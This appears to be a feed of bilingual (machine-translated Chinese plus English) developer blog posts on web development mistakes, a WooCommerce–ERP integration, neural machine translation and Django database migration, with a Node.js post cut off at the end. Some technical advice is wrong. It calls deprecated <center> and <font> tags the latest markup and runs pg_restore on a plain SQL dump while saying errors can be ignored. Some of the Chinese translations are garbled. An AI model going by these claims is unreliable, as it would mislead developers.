item.title: Web 开发人员犯的常见错误以及如何避免它们 | Common Mistakes Made By Web Developers And How To Avoid Them
item.description:
自 1990 年万维网问世以来，Web 开发领域已经从网页动态演变为 Web 应用程序。 最终用户不再浏览网页来阅读静态内容。 网站现在具有动态功能以提高其参与率。 交互式网站正在开发中，用户可以使用这些网站执行日常活动，例如购买杂货、银行业务、纳税等。但是，这些应用程序是由人类开发的，并且应该会发生错误。 通常，一个简单的错误可能会影响您网站中的关键功能，从而导致用户转移到其他网站，从而降低您的利润和 SERP 排名。 在本文中，我们将讨论开发人员在开发 Web 应用程序时常犯的错误。

使用非响应式设计

如今，不牢记 RWD（响应式网页设计）将导致大型网站显示在带有小按钮的小屏幕上，从而使最终用户难以阅读内容或单击水平滚动条以及许多其他差异，所有其中会导致糟糕的用户体验。

  • 确保在开始开发和编写媒体查询之前针对某些设备和分辨率，以便网站在所有设备上正确显示。

  • 除了在模拟器中进行测试外，还要在真实设备中测试您的网站，以了解最终用户在使用真实设备访问您的网站时的体验。

嘿，您在寻找CSS Canvas吗：- 目前正在开发中，尚未成为任何规范的一部分，CSS-canvas 是一种新兴技术，允许开发人员使用 HTML5 Canvas 作为背景图像。

请参阅以下教程，了解如何在 LambdaTest 上执行响应式测试。

现在，您可以在同时执行响应性测试的同时调试多种设备尺寸。 还要在工具上标记错误，例如 Jira、Trello、Asana、GitHub 等。LT 浏览器是用于移动视图调试的最佳开发友好型浏览器，您可以在其上查看您的网站在 Android 和 iOS 分辨率下的移动视图。

取决于网站构建工具

如今，许多公司都提供工具，您可以使用这些工具轻松构建具有拖放功能的网站。 这些工具的问题在于后端。 每个设计决策都会添加多行代码，使网站变慢并且随着时间的推移，这可能会导致性能问题并影响关键功能。

  • 如果您没有足够的时间进行编码，您可以通过 Themeforest、Envato 或其他平台以最低价格购买模板，您将获得多个响应式和跨浏览器兼容的模板，这些模板将满足您的目的。 您只需要在启动网站之前添加内容。

  • 与其使用网站构建工具，不如使用提供内容管理服务的平台，如 WordPress 或 Joomla。 除了无缝托管您的网站外，他们还将为您提供与您的网站所服务的目的相匹配的多个主题。

你知道CSS Cascade Layers吗：-@layer 规则允许作者明确地布置应用于元素的样式。 图层中的样式不会影响其他元素，即使应用于它们的更高级别的样式表具有与使用这些样式的元素匹配的选择器。

使用过时的 HTML

正所谓，旧习难改。 在早期版本的 HTML 中，最新的标记选项不可用，这使工作更容易。 从早期开始编码的开发人员仍然有使用批次或跨度和'&nbps'的习惯，这不仅增加了代码行，而且还会在更新的浏览器（如 Microsoft Edge）中导致布局问题。

  • 使用最新技术更新自己并开始使用中心或字体等最新标记元素，这不仅会使您的工作更轻松，而且还会产生符合最新行业标准的干净代码。

  • 专注于使用 HTML 来描述您的内容，并使用 CSS3 的最新功能来设计内容的布局。

输入验证不足

最终用户是人，错误也会发生在他们身上。 不完整的表单验证可能会导致电话号码字段中的字母输入错误或电子邮件格式不正确，缺少“。” 或者 '@'。 所有这些都会导致用户提交的数据不正确，从而可能导致无法将信息传递到用户的物理地址或在线地址。

  • 最新的前端框架提供了出色的验证规则，这些规则易于编码，可以确保用户输入完美无缺并符合设置的格式。

  • 验证规则的实施是标准编码实践的一部分，正确使用它们将产生用户首选的优质网站，从而提高其在搜索引擎中的排名。

还可以查看CSS clip-path 属性：- 使用 css-clip-path，您可以为 HTML 元素创建复杂的形状。 这是一种定义元素的哪些部分将在屏幕上可见的方法。

跨浏览器兼容性问题

当 Internet Explorer 是唯一可用于访问网站的浏览器时，那些日子早已一去不复返了。 目前，除了 Chrome、Firefox、Safari 等大牌之外，还有数百种桌面和移动浏览器，甚至是用户访问网站时首选的一些设备专用浏览器。

  • 使用您的网站可以正常运行的分析工具和目标浏览器。 进行适当的测试并找出任何此类浏览器中是否出现任何可用性或功能问题。

  • 使用像LambdaTest这样的云测试平台，它让您有机会同时在多个浏览器上快速无缝地测试您的网站。 找出导致任何特定浏览器损坏的任何 CSS 或 HTML 问题，并通过替换它们或添加供应商特定代码来解决问题。

除了上面提到的错误之外，还有其他常见的错误，如内容不佳、安全问题、设计不佳、错误的 SEO（搜索引擎优化）技术等等。 所有这些都可能导致您的网站在搜索引擎结果中的位置远远低于。 确保这些不会发生，您的网站将成为全球用户的首选。



原文:

Ever-since the introduction of World Wide Web in 1990, the domain of web development has evolved dynamically from web pages to web applications. End users no longer browse web pages for reading static content. Websites now have dynamic features to increase their engagement rate. Interactive websites are being developed using which users can perform their day to day activities like shopping for groceries, banking, paying taxes, etc. However, these applications are developed by human beings, and mistakes are supposed to happen. Often a simple mistake can impact a critical functionality in your website that will lead the user to move away to a different website, reducing your profit and SERP ranking. In this article, we shall discuss the common mistakes made by developers while developing a web application.

Using Non-Responsive Design

Nowadays, Not keeping RWD(Responsive Web Design) in mind will result in a large website displayed in a small screen with small buttons making it difficult for the end user to read the content or click on the horizontal scrollbar along with many other discrepancies, all of which will lead to a bad user experience.

  • Ensure that you target some devices and resolutions before you start developing and writing media queries so that the website is displayed properly on all devices.

  • Apart from testing in emulators, test your website in real devices as well to get the feeling of how an end user experiences your website when accessed using a real device.

Hey, are you looking for CSS Canvas:- Currently under development and not yet part of any specification, CSS-canvas is an emerging technology that allows developers to use HTML5 Canvas as a background image.

Refer to the below tutorial on how to perform responsive testing on LambdaTest.

Now you can debug multiple device sizes while performing responsiveness tests simultaneously. Also mark a bug on tools, such as Jira, Trello, Asana, GitHub, etc. LT Browser is the best dev-friendly browser for mobile view debugging on which you can see the mobile view of your website on Android and iOS resolutions.

Depending on Website Builder Tools

Many companies nowadays offer tools using which you can easily build a website with drag and drop features. The problem with those tools lies in the backend. Each design decision adds multiple lines of code that makes the website slower and with time, this may cause performance issues and impact critical functionalities.

  • If you do not have enough time for coding, you can purchase templates via Themeforest, Envato or other platforms where at a minimal price, you will get multiple responsive and cross-browser compatible templates that will serve your purpose. You will only need to add the content before launching your website.

  • Instead of website builder tools, it is better to use platforms offering content management services like WordPress or Joomla. Apart from the seamless hosting of your website, they will also offer you multiple themes that match the purpose served by your site.

Do you know CSS Cascade Layers:- The @layer at-rule allows authors to explicitly lay out the styles that apply to an element. The styles in a layer do not affect other elements, even if a higher-level style sheet applied to them has a selector that matches the element where these styles are used.

Using Outdated HTML

It is rightly said that old habits are difficult to get rid of. In earlier versions of HTML, latest Markup options were not available that makes the job easier. Developers who started coding since earlier days still have the habit of using lots or spans and ‘&nbps’s which not only increases the line of code but also causes layout issues in updated browsers like Microsoft Edge.

  • Update yourself with the latest technologies and start using latest Markup elements like center or font that will not only make your job easier but also result in a clean code that complies by latest industry standards.

  • Focus on using HTML to describe your content and use the latest features of CSS3 to design the content’s layout.

Insufficient Input Validation

Web developers often make the mistake of ignoring form validation and trust on user input. End users are human, and mistakes happen with them also. Incomplete form validation may result in a mistyped alphabet in the phone number field or an incorrect email format missing the ‘.’ or ‘@’. All these leading to incorrect data submitted by the user that may lead to failed delivery of information to the user’s physical or online address.

  • Latest front-end frameworks provide outstanding validation rules that are simple to code and can ensure that user input is flawless and according to the format that has been set.

  • Implementation of a validation rule is a part of standard coding practice and proper usage of them will result in a quality website preferred by users, thereby, increasing its ranking in the search engine.

Also check out CSS clip-path property:- With css-clip-path, you can create complex shapes for your HTML elements. It’s a way to define what part of an element will be visible on screen.

Cross Browser Compatibility Issues

Those days are long gone when the Internet Explorer was the only browser available to access websites. At present, apart from the big shots like Chrome, Firefox, Safari, there are hundreds of desktop and mobile browsers, even some device-specific browsers that are preferred by users for accessing websites.

  • Use analytic tools and target browsers on which your website is meant to run properly. Carry out proper testing and find out if any usability or functional issue is occurring in any such browser.

  • Use cloud testing platforms like LambdaTest which provides you with the opportunity to quickly and seamlessly test your website on multiple browsers simultaneously. Find out any CSS or HTML issues that are causing breakage in any specific browser and fix the issues by replacing them or adding vendor specific codes.

Apart from the mistakes mentioned above, there are other common mistakes like poor content, security issues, poor design, wrong SEO(Search Engine Optimization) techniques, and many others. All of which may lead to your website placed far below in the search engine results. Ensure that these do not happen and your website will be the one preferred by users worldwide.
item.author: arnabroychowdhury

item.title: ERP 2 电子商务项目 | ERP 2 Ecommerce Project
item.description:
在工作环境中最具挑战性的任务之一是将处理相似任务的两个部门联合起来。 对于这个项目，我们指的是物流部门以及我们的在线业务，例如我们的电子商务商店以及 IT 部门。

作为一个例子，我们可以检查当必须批量更改产品价格时需要做什么。 起初，物流部门必须计算可用库存数量，然后与会计主管一起计算新价格。 然后将这些价格添加到列表中，然后转发给 IT 部门进行进一步处理，最后在电子商务商店中手动更新。

这项任务对两个部门来说都很耗时，而且在纸面上和现实生活中都很耗时，尤其是在产品数量很高的情况下。 必须创建一个解决方案以提高生产力并减少花费在单个任务上的时间。

执行此任务的一大优势是组织中的 ERP 应用程序能够处理可以直接编程到其一般逻辑中的脚本。 利用这一优势，我们搭建了一座桥梁，帮助将物流部门与在线商店直接连接起来。 该系统还支持处理 SOAP 请求，这有助于我们以两种方式实现此任务，例如将 ERP 应用程序的更改直接引入在线商店，反之亦然。

电子商务商店是在 Woocommerce 平台上开发的，该平台是 WordPress CMS 中使用的一个开源插件，用于将常规博客转换为成熟的在线商店。 为了让 ERP 应用程序直接与电子商务商店通信，必须创建一个应用程序以利用组织的需求。 这是通过使用 .NET 编程语言对所需的应用程序以及 ERP 请求处理进行编码来实现的。

需要的一些核心方面是：

  • 更新产品（价格、SKU、描述、库存数量等）
  • 查看和更新​​客户信息
  • 订单处理
  • 包裹追踪

执行

在开始所有应用程序头脑风暴之前，我们必须首先正确配置 Woocommerce REST API，检查其可靠性并查看它是否符合组织的需求。 在初始设置和测试之后，我们必须确保实施是安全的，并且禁止任何第三方访问。 广泛的技术被用于安全性，例如 HTTPS 连接、速率和 IP 限制、暴力保护、身份验证等。还创建了一个伪用户来处理读取和写入权限，并确保应用程序范围是仅限于实施所需的变量。 然后我们准备测试 API 是否正常工作。

 curl -X PUT https://example.com/wp-json/wc/v3/products/794 \ -u consumer_key:consumer_secret \ -H "Content-Type: application/json" \ -d '{ "regular_price": "24.54" }'

经过彻底的测试，一旦我们确定 API 可以正常读取和写入变量，我们就可以开始主应用程序的开发。

发展

地球上的每个应用程序无论多么免费、开源，或者像某些供应商喜欢称它们为“解锁”，总是存在不符合每个组织需求的限制。 棘手的部分是即使 ERP 应用程序基于 .NET，我们可以引入的代码功能也相当有限。 由于需要实现的变量范围相当大，因此我们选择了中间人应用程序（从现在开始称为“主应用程序”）。

在 ERP 应用程序上，处理水平相当有限。 创建了几个侦听器模块，用于检查最终用户是否正在从服务器保存或请求数据。 然后将所有这些信息划分为变量，这些变量被馈送到主应用程序。

一旦主应用程序接收到这些变量，它就会分析内容以确定用户的需求，进一步处理它并提供所需的结果。

在此过程之后，应用程序会将请求转发给 Woocommerce REST API，后者对其进行处理并做出适当的响应。

上面的代码是最终应用程序如何与更新订单、错误纠正、异常处理和响应处理等其他几个方面一起工作的一个非常小的片段。 为了记录来自 REST API 的请求和响应，还必须创建主应用程序的“伙伴”。 这有助于非技术人员了解服务器的响应并根据反馈采取适当的行动。

概括

完整的实现包含超过 4000 行代码，其中包含上述模块。 出于安全和专有原因，省略了有关实施的一些信息。

该项目帮助后勤部门更轻松地处理日常任务，而无需将其转发给 IT 部门进行进一步实施和纠正。 随着组织的发展，这类日常任务可能会很耗时，使用这种方法，我们能够提高生产力并减少工作双倍时间，这是以前必须完成的，以实现像更新产品价格这样简单的事情。



原文:

One of the most challenging tasks when in a work environment is to unite two departments that handle similar tasks. For this project we are referring to the logistics department along with our online presence such as our E-Commerce store as well as the IT department.

As an example we can examine what needed to be done when product prices had to be changed in bulk. At first the logistics department had to calculate the available stock quantities and then in conjunction with an accounting supervisor calculate the new prices. These prices were then added to lists that were forwarded to the IT department for further processing and finally manually updated in the e-commerce store.

This task is time consuming for both departments and lengthy both on paper as well as in real life especially if the product count was high. A solution had to be created in order to increase productivity and reduce the time spent on single tasks.

A big plus for the implementation of this task is that the ERP application at the organization is able handle scripts that can be programmed directly into its general logic. Using this advantage we created a bridge that helped connect the logistics department with the online store directly. The system also had support for handling SOAP requests which helped us implement this task both ways, like introducing changes from the ERP application directly to the online store and vise versa.

The E-Commerce store was developed on the Woocommerce platform which is an open source plugin used in the WordPress CMS to transform a regular blog to a full fledged online store. Woocommerce has a built-in REST API which allows us to implement a variety of tasks like updating product variables, view and update customer information, and much more.

In order for the ERP application to communicate directly with the E-Commerce store an application had to be created in order to utilize the organizations needs. This was achieved by coding the required applications, as well as the ERP request handling, in the .NET programming language.

Some of the core aspects needed were:

  • Updating products (prices, SKUs, description, stock quantities, etc.)
  • Viewing and updating customer information
  • Order processing
  • Parcel tracking

Implementation

Before starting with all the application brainstorming we had to first configure the Woocommerce REST API properly, check its reliability and see if it matches the organizations needs. After initial setup and testing we then had to insure the implementation is secure and any third party access is prohibited. A wide range of techniques were used for security such as an HTTPS connection, rate and IP limiting, brute force protection, authentication, etc. Also a pseudo-user was created to handle read and write permissions as well as insure that the application scope was limited only to the variables needed for the implementation. We are then ready to test if the API works properly.

curl -X PUT https://example.com/wp-json/wc/v3/products/794 \
    -u consumer_key:consumer_secret \
    -H "Content-Type: application/json" \
    -d '{
  "regular_price": "24.54"
}'

After thorough testing and once we are certain that the API works properly for both reading and writing variables we can then start with the main application development.

Development

Every application on the planet how matter how free, open-source, or like some vendors like to call them, “unlock” there are always limitations in place that don’t match every organizations needs. The tricky part was that even though the ERP application was based on .NET, the code functionality that we could introduce was fairly limited. Because the scope of variables needed to implement was fairly big we opted to go for a man-in-the-middle application (referred to as “main application” from now on) as a result.

On the ERP application the processing level was fairly limited. Several listener modules were created that would check whether the end user was saving or requesting data from the server. All this information was then divided into variables which are fed to the main application.

Once the main application receives these variables it analyses the content in order to the determine the users’ needs, further process it and provide with the required result.

After this procedure the application then forwards the request to the Woocommerce REST API which process it and responds appropriately.

The code above is a very small snippet of how the finalized application works along with several other aspects like updating orders, error correction, exception handling and response handling. A “sidekick” to the main application had to also be created in order to log requests and responses to and from the REST API. This helped the non-tech savvy staff understand the servers’ response and act appropriately based on feedback.

Summary

The full implementation contains more that 4000 lines of code which consist of the modules mentioned above. Several information regarding the implementation were omitted for security and proprietary reasons.

This project helped the logistics department tackle every day tasks more easily without having to forward them to the IT department for further implementation and correction. As an organization grows these kind of everyday tasks can be time consuming and using this method we were able to increase productivity and reduce working double time, that had to be previously done in order to achieve something as simple as updating a product’s price.
item.author: giannisftaras

item.title: 理解机器翻译的概念 | UNDERSTANDING THE CONCEPT OF MACHINE TRANSLATION
item.description:
机器翻译是一项了不起的技术，但 Mohd Mustafa 相信它并不美妙

机器翻译始于 1950 年代左右，涉及大量人工处理，其中计算能力、数据可用性和存储能力等一些限制确实具有挑战性。

大约在 2000 年代，统计数据库的出现被开发人员用来教计算机翻译文本，但体力劳动的问题仍然适用。

大约在 2016 年，来自 Google 的开发人员提出了使用神经学习模型和人工智能来训练翻译引擎的令人兴奋的想法。 与早期存在的机器翻译引擎相比，谷歌构建的机器翻译引擎显示出显着的改进。 在跨多种语言的文本翻译性能方面，效率和速度都得到了改进。

事实证明，神经机器翻译非常有效，以至于谷歌改变了方向并将其作为他们的主要开发模式。 其次是微软和亚马逊。

什么是机器翻译（MT）？

机器翻译是使用人工智能自动将内容从一种语言翻译成另一种语言的过程，无需人工输入。

图像显示一种语言到多种语言的翻译

使用随着时间的推移学习并且可以定制以包含静态业务术语的语言软件是一种资产。 机器语言翻译可以节省大量时间，因为它能够在几秒钟内翻译整个文本文档。 但是，请记住，人工翻译应始终对 MT 完成的翻译进行后期编辑。

员工可以使用 MT 软件跨时区进行交流和协作。 有了共同的公司术语知识，判断错误的可能性就会降低。

使用随着时间的推移学习并且可以定制以包含静态业务术语的软件是一种资产。 简单地说，大多数 MT 软件都提供一致的翻译。 感觉和意见通常反映在人工翻译中，并且可以根据翻译人员的不同而改变情绪。

机器翻译的类型

关于应用 MT 的完美领域的诚实真相，更结构化的内容更适合 MT，例如技术文档和知识产权等

营销和品牌推广等口语内容或其他面向客户的内容 MT 是可选的，因为结果需要更多的人工编辑。

机器翻译确实会根据其用例而有所不同，为您的业务选择合适的 MT 工具取决于用例、预算、计算能力，有些 MT 太贵了，您可能会产生不会为您的业务增加利润的成本。

通过了解 MT 的类型，将有助于根据用例选择正确的选择，让我们看看这些 MT 类型是什么：-

  • 基于规则的机器翻译(RBMT)：最早的机器翻译形式，由许多手动操作组成。 它使用由语言专家开发的语法和语言规则，以及可以针对特定主题或行业进行定制的词典。
  • 统计机器翻译(RBMT)：基于规则的机器翻译的改进形式。 它处理自动将一种人类语言（例如斯瓦希里语）的句子映射到另一种人类语言（如英语）。
  • 神经机器翻译(NMT)：这是 MT 的一种智能形式，与其他类型的 MT 相比，它使用人工智能技术产生准确和更快的翻译。 在 NMT 之前，机器使用统计模型进行文档翻译服务，这些模型由不适应语言的灵活性和比喻性质的严格规则集操作。

语言障碍影响各种商业活动。 随着世界因技术而变得越来越小，企业在适应日益国际化的消费者群体的需求方面遇到了困难。 聘请翻译公司和翻译人员可能会很昂贵，但利用技术执行文档翻译服务是增加理解和促进包容性的一种经济有效的选择。

机器翻译是如何工作的？

了解机器翻译引擎的工作原理非常有趣，例如Masakhane translate 、G oogle translate、 Amazon 、 Microsoft Translator等

我们将把神经机器翻译看作是目前世界上最常用的机器翻译创新技术形式。

神经机器翻译是一个单一系统，可以直接在源文本和目标文本上进行训练，与 SMT 相比，不需要专门的系统。

图片来自 DeepAI

简而言之，为了教机器如何执行翻译，您应该拥有数据，即根据您要处理的语言的数百万个句子的集合。 它显示正确的翻译并将这些句子放入神经网络，然后它将学习如何在这些例句之间进行翻译，以便您可以看到，为了让翻译变得聪明，它应该被暴露或训练有数百万个句子。

听起来很容易？

哎呀！ 不，这是非常技术性的，让我们看看这背后是什么

每种语言都有两个重要组成部分：

  • 令牌- 语言的最小单位。
  • 语法- 定义标记的顺序。

语法是语言翻译中的一个敏感案例，它涉及语法分析和语义分析，这是翻译复杂性开始的地方，仅仅是因为语言的语法和语义不同。

但是计算机理解人类语言语法的方式和我们人类一样吗？

答案是否定的，因为计算机确实理解数字。

神经网络能够学习数据中的模式，并能够将源语言（例如斯瓦希里语）翻译成目标语言（例如英语）。

输入和输出都是句子，但计算机将它们作为数值。 首先，它们以数字形式（向量和矩阵）执行转换。

生成的向量应转换为第二语言（英语）

这个过程称为编码器-解码器架构。

编码器-解码器架构

可以通过应用各种改进的方法而不是循环神经网络(RNN) 来修改此架构，这仅仅是因为 RNN 不会在令牌进行不完美翻译之前和之后进行检查。 我们不是仅在前向模式下从第一个令牌开始运行 RNN，而是从最后一个从后向前运行的令牌开始另一个 RNN。 双向 RNN添加了一个隐藏层，该层向后传递信息以更灵活地处理。

双向 RNN 架构

然后，让我们用注意力机制完成，注意力机制是神经架构的一部分，它能够动态突出输入数据的相关特征，在 NLP 中，这些特征通常是一系列文本元素。 它可以直接应用于原始输入或其更高级别的表示。

注意力机制

神经网络被认为是一种以简化方式模拟人脑动作的努力。 注意力机制是一种尝试实现相同的动作，即选择性地专注于一些相关的事情，而忽略深度神经网络中的其他事情。 关于注意力机制的更多信息，我们开始吧。

最后的想法

随着翻译工具变得更加可靠，翻译机构在提供更高质量和更快周转翻译方面将面临更多竞争。

这意味着需要营销和销售来保持市场竞争力。 能够销售您的服务对于说服客户选择您的代理机构而不是您的竞争对手至关重要。

翻译机构总是需要提供准确的服务，校对以消除错误，这仅仅是因为大多数现有的翻译工具都仅限于经过培训的数据量。

同样在机密信息方面，公司还没有准备好在网上公开他们的机密数据，例如合同和医疗文件等。

文字周游世界。 翻译安娜鲁斯科尼的驾驶



原文:

Machine Translation is wonderful technology but it is not wonderful to trust by Mohd Mustafa

Machine Translation started around the 1950s and involve a lot of manual processing, where some limitations such as the power of computing, data availability, and storage capabilities were really challenging.

Around the 2000s, the emergence of statistical databases was used by developers to teach computers to translate text but the issue of manual labor was still applicable.

Around 2016, Developers from Google come up with the exciting idea of using Neural learning models and Artificial Intelligence to train translation engines. The built machine translation engine from Google shows a significant improvement compared to the early existed machine translation engines. Both effective and faster in terms of text translations performance across many languages was improved.

Neural Machine Translation proved so effective that Google changed course and adopted it as their primary development model. Followed by Microsoft and Amazon.

What is Machine Translation(MT)?

Machine Translation is the process of using Artificial Intelligence to automatically translate content from one language to another without human input.

Image shows the translation of one language to Multiple languages

Using language software that learns over time and can be customized to include static business nomenclature is an asset. Machine language translation can save significant time as it is capable of translating entire text documents in seconds. However, please bear in mind that human translators should always post-edit translations done by MTs.

Employees can communicate and collaborate across time zones with MT software. With a shared knowledge of corporate terminology, the likelihood of judgment errors is diminished.

Using software that learns over time and can be customized to include static business nomenclature is an asset. Simply most MT software provides consistent translations. Feelings and opinions are often reflected in human translations, and sentiment can be altered depending on who is doing the translating.

Types of Machine Translations

The honest truth about the perfect area to apply MTs, More structured content works better with MTs such as technical documentation, and Intellectual property, etc

Colloquial content like marketing and branding or other customer-facing content MTs is optional to use simply because the results will need more human editing.

Machine Translations do vary according to their use cases, selecting the right MTs tool for your business depends on the use case, budget, computing power some of the MTs are too expensive and you can incur a cost that will not add profit to your business.

By understanding types of MTs, it will help to select the right choice depending on the use case, Let's look what are those MTs types are:-

  • Rule-Based Machine Translation(RBMT): the earliest form of Machine Translation that consists of many manual operations. It uses grammar and language rules, developed by language experts, and dictionaries that can be customized to a specific topic or industry.
  • Statistical Machine Translation(RBMT): the improved form of Rule-Based Machine translation. It deals with automatically mapping sentences in one human language, for example, Swahili into another human language such as English.
  • Neural Machine Translation(NMT): this is a smart form of MT, which uses Artificial Intelligence Technology to produce accurate and faster translation compared to other types of MTs. Before NMT, machines used statistical models for document translation services, operated by rigid sets of rules that didn’t accommodate the flexibility and figurative nature of language.

Language barriers affect various business activities. As the world becomes smaller with technology, businesses encounter difficulty accommodating the needs of an increasingly international consumer base. Hiring a translation company and translators can be expensive, but utilizing technology to perform document translation services is a cost-effective option for increasing understanding and promoting inclusivity.

How Machine Translation Works?

It is very interesting to understand how Machine Translation engines work such as Masakhane translate, Google translate, Amazon, Microsoft Translator, etc

We will look at Neural Machine Translation, as the most used form of MTs innovation technology in the world currently.

Neural Machine Translation is a single system that can be trained directly on the source and target text without the need for specialized systems compared to SMTs.

Image by DeepAI

In simple words, In order to teach a machine how to perform translation, you should have data, a collection of million sentences depending on the languages you want to work on. which shows correct translations and fits those sentences into Neural Networks then It will learn how to translate between those example sentences so you can see in order for a translator to become smart, it should be exposed or trained with millions of sentences.

Sounds easy?

Oops! No, it is very technical let's see what is behind this

Every language has 2 important components:

  • Tokens - smallest unit of language.
  • Grammar - defines the ordering of tokens.

How about It is Sunny, the sentence has only 3 tokens which are  It, is  , and sunny If languages were only dependent on tokens and grammar be ignored language translation could be much easier.

Grammar is a sensitive case in language translation, It involves syntax analysis and semantic analysis this is where the complexity of translation begins, simply because languages differ in their syntax and semantics.

But do computers understand human language grammar the same way as we humans do?

The Answer is No, simply because computers do understand numbers.

Instead of defining the grammar for the computer to understand, Neural Networks do it for you. Neural Network is able to learn the pattern in data and is able to translate from a source language(for example Swahili) to a target language(for example English).

Inputs and outputs are both sentences but the computer takes them as numeric values. First of all, they perform the conversion in numeric forms(vectors and matrices).

{Sentence (Swahili) — to — Vector form}

The resulting vector should be converted into a second language(English)

{Vector form  — to — Sentence(English)}

This process is called encoder-decoder architecture.

Encoder-Decoder Architecture

This architecture can be modified by applying various improved methods rather than Recurrent Neural Networks(RNN), Simply because RNN does not check before and after the token makes imperfect translations. The improved way of RNN is Long Short-Term Memory(LSTM) where it able to check before and after the token but is still confused with long sentences.

The improved version of LSTM is Bidirectional Recurrent Neural Networks. Instead of running an RNN only in the forward mode starting from the first token, we start another one from the last token running from back to front. Bidirectional RNNs add a hidden layer that passes information in a backward direction to more flexibly process.

Bidirectional RNN architecture

Then, let's Finalize with the Attention mechanism , The attention mechanism is a part of a neural architecture that enables to dynamically highlight relevant features of the input data, which, in NLP, is typically a sequence of textual elements. It can be applied directly to the raw input or to its higher-level representation.

Attention Mechanism

A neural network is considered to be an effort to mimic human brain actions in a simplified manner. Attention Mechanism is an attempt to implement the same action of selectively concentrating on a few relevant things while ignoring others in deep neural networks. More about attention mechanism here we go.

Final Thoughts

As translation tools become more reliable, there will be more competition for translation agencies to deliver better quality and faster turnaround translations.

This means marketing and sales will be needed to stay competitive in the market. Being able to sell your services will be crucial to convince clients to choose your agency instead of your competitors.

Translational Agencies will be always be needed to provide accurate services, proofreading in order to eliminate errors, simply because most of the existing translation tools are limited to the amount of data that has trained.

Also in terms of confidential information, companies are not ready to expose their confidential data online such as contracts and medical documents, etc.

Words travel worlds. Translator to the driving by Anna Rusconi
item.author: tonyloyt

item.title: 如何在 Django 中将开发数据库迁移到生产环境中 | How to migrate development database into production in Django
item.description:
我搜索了很多关于如何将 Django 模型以及整个数据从开发数据库迁移到生产环境的信息，我找到了很多关于它的解释（其中一个很好的解释是这里），但没有找到简单的解决方案。 对于这个问题，我提出了我的解决方案，并在这个博客中解释了如何做到这一点。 在谈到这个博客的核心内容之前，我只想提出一个问题和我的想法。

我需要将我的迁移文件推送到 GitHub 吗？

每个人都有自己的观点。 在我的 Django 旅程开始时，我也对什么是最佳实践感到困惑。 从 阅读此答案后，我也尝试推动我的迁移。 但我认为这不是一个好方法，所以我从 GitHub 中删除了迁移。

好的，现在让我们一步一步开始核心的事情：

第一步是创建数据库备份。 就我而言，我使用的是 PostgreSQL 数据库。 要创建备份文件，我只需要在终端中运行以下命令，

 pg_dump -U postgres -h localhost -d database > db_backup_2022_05_20.sql

其中， postgres是数据库用户， localhost是数据库主机， database是数据库名， db_backup_2022_05_20.sql是备份文件名。

由于本篇博客只是关于如何迁移数据库（而不是关于如何将 Django 站点发布到生产中的整个过程），所以我只关注数据库迁移。 拉取代码到服务器后，第一步就是只用Django命令迁移数据库表和schema，

 # make migrations python manage.py makemigrations # migrate models python manage.py migrate

如果你想让干净的数据库初始化生产环境，这是一个很好的方法，不需要进一步的操作。 但是如果要将所有数据从开发环境迁移到生产环境，则需要恢复开发数据库。 为此，如果使用常规方法，可能会由于外键和重复数据问题而出现错误。 但是为了防止这种操作并仅恢复数据， psql提供了一个不错的命令行。 您只需要执行以下操作，

 pg_restore -U postgres -h IP -d database --disable-triggers --data-only db_backup_2022_05_12.sql

其中， postgres是数据库用户， ip是服务器 IP 地址， database是数据库名称， db_backup_2022_05_12.sql是备份文件位置。 如果您想了解更多关于 pg_restore 命令的信息，请查看此官方文档。

此步骤也可能会引发一些错误消息或警告，但您可以简单地忽略它们。

如果你想更新 Django 模型，你可以先在开发环境中测试你的模型。 要在生产中更新这些更改，您只需在服务器上迁移模型如下，

 # make migrations python manage.py makemigrations # migrate models python manage.py migrate

开发环境和生产环境的迁移文件会有所不同。 如果您从开发和生产中检查这两个数据库，您会在django_migration表中找到不同的数据。

恭喜！ 您最终将包含所有数据的数据库从开发环境迁移到生产环境。

如果你喜欢这个博客，请订阅我的 YouTube 频道来支持我：https: //www.youtube.com/c/iamtekson



原文:

I search a lot about how to migrate the Django model as well as whole data from the development database to production, and I found lots of explanation about it (One of the good explanations is here) but did not find the easy solution. For this problem, I come up with my solution and I am explaining in this blog how to do that. Before moving to the core thing about this blog, I just want to raise one question and my thought about it.

Do I need to push my migration file to GitHub?

All individuals have their own perspectives. I was also confused about what is the best practice in beginning of my Django journey. After reading this answer from, I tried to push my migrations as well. But I think it is not a good way, so I removed the migrations from GitHub.

Okay, now lets start the core thing step by step:

1. Create the backup for your database

The first step is to create the database backup. In my case, I am using the PostgreSQL database. To create the backup file, I simply need to run the following command in the terminal,

pg_dump -U postgres -h localhost -d database > db_backup_2022_05_20.sql

where, postgres is the database user, localhost is the database host, database is the database name and db_backup_2022_05_20.sql is the backup file name.

2. Migrate the Django models to the server

Since this blog is only about how to migrate the database (not about the whole procedure of how to publish the Django site into production), I am only focusing on the database migration. After pulling the code to the server, the first step is to migrate the database tables and schema only by using the Django command,

# make migrations
python manage.py makemigrations # migrate models
python manage.py migrate

3. Migrate the data

If you want the clean database to initialize the production environment, it is a good way to go, no further action is needed. But if you want to move all the data from the developer environment to production, you need to restore the development database. To do so, if you go with the normal method, you might get an error due to a foreign key, and also duplicated data issue. But to prevent this action and restore data only, the psql provides a nice command line. You just need to do the following,

pg_restore -U postgres -h IP -d database --disable-triggers --data-only db_backup_2022_05_12.sql

Where, postgres is the database user, ip is the server IP address, database is the database name and db_backup_2022_05_12.sql is the backup file location. If you want to know more about the pg_restore command, please check this official documentation.

This step might throw some error messages or warnings as well, but you can simply ignore those.

4. What next?

If you want to update the Django model, you can first test your model in the development environment. To update those changes on production, you just need to migrate the model as below on the server,

# make migrations
python manage.py makemigrations # migrate models
python manage.py migrate

The migration file from the development and production environment will be different. If you check both databases from development and production, you will find the different data in the django_migration table.

Congratulations! you finally migrated the database with all the data from the development environment to production.

If you like this blog, please support me by subscribing to my YouTube channel: https://www.youtube.com/c/iamtekson
item.author: iamtekson

item.title: 使用 Node.js 为您的电子商务门户开发一个很棒的后端 | Develop an awesome back end for your eCommerce portal with Node.js
item.description:
电子商务部门关注的重大问题
对电子商务的兴趣正在逐步上升，它使我们的生活更加顺畅和无忧无虑，满足了我们所有的购物需求，尽管疫情受到了严重打击。 无论如何，对电子商务日益增长的依赖同样也在提高人们对更智能的电子商务发展的兴趣。

几天后，零售商只需要建立一个带有后端的简单电子商务网站。 然而，目前，先进电池使用的扩展和对多功能应用的兴趣正在变成最广泛认可的模式。

尽管如此，我们希望了解电子商务发展过程中最知名的问题：

问题#1：一个美妙的前端和不幸的后端——这对电子商务业务来说是一个危险：

